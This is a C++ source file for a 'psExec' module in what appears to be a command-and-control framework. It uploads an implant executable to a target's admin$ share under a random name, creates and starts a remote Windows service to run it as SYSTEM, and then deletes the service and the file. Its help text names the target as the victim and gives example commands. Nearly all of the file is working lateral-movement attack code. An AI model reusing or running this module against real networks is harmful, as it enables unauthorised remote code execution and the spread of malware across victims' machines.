#include "PsExec.hpp"

#include <cstring>
#include  <algorithm>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#endif

#include "Common.hpp"


using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

constexpr std::string_view moduleName = "psExec";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) PsExec* PsExecConstructor() 
{
    return new PsExec();
}

BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result);
BOOL createServiceWithSCM(const std::string& scmServer, const std::string& serviceName, const std::string& servicePath, std::string& result);

#else

__attribute__((visibility("default"))) PsExec* PsExecConstructor() 
{
    return new PsExec();
}

#endif


PsExec::PsExec()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
    srand(time(NULL));
}


PsExec::~PsExec()
{
}


std::string PsExec::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "PsExec:\n";
	info += "Create an exe on an SMB share of the victime and a service to launch this exec using system. \n";
    info += "The exe must be a service binary or inject into another process. \n";
    info += "You must have the right kerberos tickets. \n";
	info += "exemple:\n";
	info += "- psExec m3dc.cyber.local /tmp/implant.exe\n";
    info += "- psExec 10.9.20.10 /tmp/implant.exe\n";
#endif
	return info;
}


int PsExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
   if (splitedCmd.size() >= 3)
	{
        string scmServer = splitedCmd[1];
		string inputFile = splitedCmd[2];

		std::ifstream input(inputFile, std::ios::binary);
		if( input ) 
		{
			std::string buffer(std::istreambuf_iterator<char>(input), {});

			c2Message.set_instruction(splitedCmd[0]);
			c2Message.set_inputfile(inputFile);
			c2Message.set_cmd(scmServer);
			c2Message.set_data(buffer.data(), buffer.size());
			}
		else
		{
			c2Message.set_returnvalue("Failed: Couldn't open file.");
			return -1;
		}

	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

#ifdef __linux__ 

#elif _WIN32

#endif

	return 0;
}


std::string randomName( size_t length )
{
    auto randchar = []() -> char
    {
        const char charset[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
        const size_t max_index = (sizeof(charset) - 1);
        return charset[ rand() % max_index ];
    };
    std::string str(length,0);
    std::generate_n( str.begin(), length, randchar );
    return str;
}


int PsExec::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	const std::string cmd = c2Message.cmd();

    std::vector<std::string> splitedList;
    splitList(cmd, ";", splitedList);

    std::string scmServer=splitedList[0];
    const std::string data = c2Message.data();

    std::string result;

#ifdef _WIN32

    std::string execName = randomName(8);

    std::string dstPath="\\\\";
    dstPath+=scmServer;
    dstPath+="\\admin$\\";
    dstPath+=execName;
    dstPath+=".exe";
    std::string serviceName=execName;
    std::string servicePath="%SystemRoot%\\";
    servicePath+=execName;
    servicePath+=".exe";

    result += "Service name: ";
    result += serviceName;
    result += "\n";

    BOOL ret = createFileSMB(dstPath, data, result);
    if (ret) 
    {
        createServiceWithSCM(scmServer, serviceName, servicePath, result);

        ret = DeleteFile(dstPath.c_str());
        if (!ret) 
        {
            result += "DeleteFile Failed: ";
            result += std::to_string(GetLastError());
        }
    }
    else 
    {
        result += "Upload Failed: ";
        result += std::to_string(GetLastError());
    }

#elif __linux__

    result += "PsExec don't work in linux.\n";

#endif

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(cmd);
	c2RetMessage.set_returnvalue(result);
	return 0;
}


#ifdef _WIN32 


BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result)
{
    HANDLE hFile = CreateFile(dstPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        result += "CreateFile fail: ";
        result += std::to_string(GetLastError());
        result += "\n";
        return 0;
    }

    DWORD dwBytesWritten = 0;
    BOOL bErrorFlag = WriteFile(hFile, data.data(), data.size(), &dwBytesWritten, NULL);
    if (FALSE == bErrorFlag)
        result += "Unable to write to file\n";

    CloseHandle(hFile);

    return bErrorFlag;
}


BOOL createServiceWithSCM(const std::string& scmServer, const std::string&  serviceName, const std::string& servicePath, std::string& result)
{
    SERVICE_STATUS ss;
    // GENERIC_WRITE = STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG
    SC_HANDLE hSCM = OpenSCManagerA(scmServer.c_str(), NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) 
    {
        result += "OpenSCManager Error: ";
        result += std::to_string(GetLastError());
        result += "\n";
        return -1;
    }
    
    SC_HANDLE hService = CreateServiceA(hSCM, serviceName.c_str(), serviceName.c_str(), GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, servicePath.c_str(), NULL, NULL, NULL, NULL, NULL);
    
    if (hService == NULL) 
    {
        result += "CreateService Error: ";
        result += std::to_string(GetLastError());
        result += "\n";
        return -1;
    }
    result += "Create Service Success\n";


    hService = OpenServiceA(hSCM,serviceName.c_str(), GENERIC_ALL);
    if (hService == NULL)
    {
        result += "OpenService Error: ";
        result += std::to_string(GetLastError());
        result += "\n";
        DeleteService(hService);
        return -1;
    }
    result += "OpenService Success\n";
    
    BOOL ret = StartService(hService, NULL, NULL);
    if(ret!=0)
    {
        result += "StartService Error: ";
        result += std::to_string(GetLastError());
        result += "\n";
    }
    else
        result += "StartService Success\n";

    ret = DeleteService(hService);
    if(ret==0)
    {
        result += "DeleteService Error: ";
        result += std::to_string(GetLastError());
        result += "\n";
    }
    else
        result += "DeleteService Success\n";
    
    return 0;
}


#endif
